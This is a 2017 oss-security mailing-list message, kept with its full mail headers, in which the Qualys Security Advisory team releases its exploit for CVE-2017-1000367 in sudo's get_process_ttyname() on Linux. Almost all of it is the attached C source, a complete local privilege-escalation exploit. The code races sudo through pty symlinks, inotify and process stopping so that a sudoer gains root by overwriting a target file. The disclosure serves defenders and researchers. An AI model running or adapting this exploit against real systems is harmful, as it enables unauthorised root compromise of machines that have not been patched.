X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5242" "Wednesday" "14" "June" "2017" "09:59:26" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20170614165926.GH8074@localhost.localdomain>" "170" "[oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's get_process_ttyname() for Linux" "^Date:" nil nil "6" "2017061416:59:26" "[oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's get_process_ttyname() for Linux" (number mark "        qsa@qualys.c Jun 14  170/5242  " thread-indent "\"[oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's get_process_ttyname() for Linux\"\n") "<20170530151629.GA19040@localhost.localdomain>" ("<20170530151629.GA19040@localhost.localdomain>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 18257 invoked by uid 550); 14 Jun 2017 17:01:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 16369 invoked from network); 14 Jun 2017 16:59:44 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=qualys.com; s=google;
        h=date:from:to:subject:message-id:references:mime-version
         :content-disposition:in-reply-to;
        bh=6tuATNZAhUg7ZCRqT6iAca7t0T18e6ZirUaDfpzj6UQ=;
        b=Um0hizdKe3MwbfSQP8ulQTB6ovTUCEs7NaIdWbJU7t9Dj1SqLaP54rf7t8l2m0auHZ
         0MuyQ2IszkR53rLS6+bJmiLKyUM1M0Ve2YH/BWtlQMn5NNlca1aRt+VeJkgKhp7CO7ek
         SqLjnXi8hVs0FrHahZyHrqYNm33GjMbQoddrItuzJJDVCYS4oCcEGP+Jjr08wX70J3jL
         GvfSqa3c9u9eMlSMsfik5+gj0KHAhuSOUx6NQZOH3tcUyuRiKJsg+tAIuDsDSrVnw2oR
         B2ZniDC7g+nMHiAYHhiHFHRZw7hKX8P84jo/jz4r9tWqp+BImCMOR9IJDSU6JRFieJ+w
         eaAg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:subject:message-id:references
         :mime-version:content-disposition:in-reply-to;
        bh=6tuATNZAhUg7ZCRqT6iAca7t0T18e6ZirUaDfpzj6UQ=;
        b=q93zhBQauAi3GiA6lyezdjx3L4ticgHOZeg0aTlJS5rDGqyu6Obmm86eSH9L5ElYGB
         hfFR//Z65nPk3WL+ZA+5rxNo5kAuzZn3c5KwunEpKzOjMZqN/Bp6/v8nTqwylJ76CEzb
         acWcBqHA6pz8CuNJT4V3j9nO8hBHXV3BxnZ1LptyV27belBh1YdsWYuPi6LXnVdobvnj
         pgudkpypoeQzigY+2Tg4jiaktjPSa5XWsktnXZCq8yV8sgB8s5sniLq0t6wN6tGJwD1E
         PaAB6KAcV/FkIVZ2JHMv+Tme1H0cjgboZA6jM+0CaewdV+GNv/0xKqIVoravFgqAwyZA
         D5Uw==
X-Gm-Message-State: AKS2vOy9FBO6EN/4U8UE3TDuns1RkiHpKZVeV9QaOIiPdbKn50VhHNBY
	trTCn0u8f16RH8IfsW4=
X-Received: by 10.84.217.216 with SMTP id d24mr1152280plj.148.1497459572090;
        Wed, 14 Jun 2017 09:59:32 -0700 (PDT)
Message-ID: <20170614165926.GH8074@localhost.localdomain>
References: <20170530151629.GA19040@localhost.localdomain>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="bFsKbPszpzYNtEU6"
Content-Disposition: inline
In-Reply-To: <20170530151629.GA19040@localhost.localdomain>
Date: Wed, 14 Jun 2017 09:59:26 -0700
From: Qualys Security Advisory <qsa@qualys.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's
 get_process_ttyname() for Linux
To: oss-security@lists.openwall.com

--bFsKbPszpzYNtEU6
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi all,

Since a working exploit has been published already
(https://github.com/c0d3z3r0/sudo-CVE-2017-1000367), please find our
Sudoer-to-root exploit (Linux_sudo_CVE-2017-1000367.c) attached to this
mail. Thank you very much!

With best regards,

-- 
the Qualys Security Advisory team

--bFsKbPszpzYNtEU6
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="Linux_sudo_CVE-2017-1000367.c"

/*
 * Linux_sudo_CVE-2017-1000367.c
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <paths.h>
#include <pty.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define SUDO_BINARY "/usr/bin/sudo"
#define TARGET_FILE "/etc/init.d/README"
#define SELINUX_ROLE "unconfined_r"

#define WORKING_DIR "/dev/shm/_tmp"
#define TTY_SYMLINK WORKING_DIR "/_tty"
#define TTY_SYMLINK_ TTY_SYMLINK "_"

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(const int my_argc, const char * const my_argv[])
{
    if (my_argc <= 1) die();
    if (my_argc >= INT_MAX/2) die();
    char comm[sizeof(WORKING_DIR) + 16];
    char pts[PATH_MAX];

    #define PTS_NUM 32
    int pts_fds[2 * PTS_NUM];
    unsigned int i = PTS_NUM;
    while (i--) {
        int ptm_fd;
        if (openpty(&ptm_fd, &pts_fds[i], pts, NULL, NULL)) die();
        if (close(ptm_fd)) die();
    }
    struct stat sbuf;
    if (fstat(*pts_fds, &sbuf)) die();
    if (!S_ISCHR(sbuf.st_mode)) die();
    if (sbuf.st_rdev <= 0) die();
    if ((unsigned int)snprintf(comm, sizeof(comm), "%s/     %lu ", WORKING_DIR, (unsigned long)sbuf.st_rdev)
                                  >= sizeof(comm)) die();
    for (i = 0; i < PTS_NUM; i++) {
        if (close(pts_fds[i])) die();
    }

    if (mkdir(WORKING_DIR, 0700)) die();
    if (symlink(pts, TTY_SYMLINK)) die();
    if (symlink(TARGET_FILE, TTY_SYMLINK_)) die();
    if (symlink(SUDO_BINARY, comm)) die();

    const int inotify_fd = inotify_init1(IN_CLOEXEC);
    if (inotify_fd <= -1) die();
    const int working_wd = inotify_add_watch(inotify_fd, WORKING_DIR, IN_OPEN | IN_CLOSE_NOWRITE);
    if (working_wd <= -1) die();

    const int cpu = sched_getcpu();
    if (cpu >= CPU_SETSIZE) die();
    if (cpu < 0) die();
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) die();

    const pid_t pid = fork();
    if (pid <= -1) die();
    if (pid == 0) {
        const unsigned int argc = 3 + my_argc - 1;
        char ** const argv = calloc(argc + 1, sizeof(char *));
        if (!argv) die();
        argv[0] = comm;
        argv[1] = "-r";
        argv[2] = SELINUX_ROLE;
        memcpy(&argv[3], &my_argv[1], my_argc * sizeof(char *));
        if (argv[argc]) die();

        if (setpriority(PRIO_PROCESS, 0, +19) != 0) die();
        static const struct sched_param sched_param = { .sched_priority = 0 };
        (void) sched_setscheduler(0, SCHED_IDLE, &sched_param);
        execve(*argv, argv, NULL);
        die();
    }

    struct inotify_event event;
    if (read(inotify_fd, &event, sizeof(event)) != (ssize_t)sizeof(event)) die();
    if (kill(pid, SIGSTOP)) die();
    if (event.wd != working_wd) die();
    if (event.mask != (IN_OPEN | IN_ISDIR)) die();

    for (i = 0; ; i++) {
        if (i >= sizeof(pts_fds) / sizeof(*pts_fds)) die();
        int ptm_fd;
        char tmp[PATH_MAX];
        if (openpty(&ptm_fd, &pts_fds[i], tmp, NULL, NULL)) die();
        if (!strcmp(tmp, pts)) break;
        if (close(ptm_fd)) die();
    }
    while (i--) {
        if (close(pts_fds[i])) die();
    }
    if (kill(pid, SIGCONT)) die();
    if (read(inotify_fd, &event, sizeof(event)) != (ssize_t)sizeof(event)) die();
    if (kill(pid, SIGSTOP)) die();
    if (event.wd != working_wd) die();
    if (event.mask != (IN_CLOSE_NOWRITE | IN_ISDIR)) die();

    if (rename(TTY_SYMLINK_, TTY_SYMLINK)) die();
    if (kill(pid, SIGCONT)) die();

    int status = 0;
    if (waitpid(pid, &status, WUNTRACED) != pid) die();
    if (!WIFEXITED(status)) die();

    if (unlink(comm)) die();
    if (unlink(TTY_SYMLINK)) die();
    if (rmdir(WORKING_DIR)) die();
    exit(WEXITSTATUS(status));
}

--bFsKbPszpzYNtEU6--
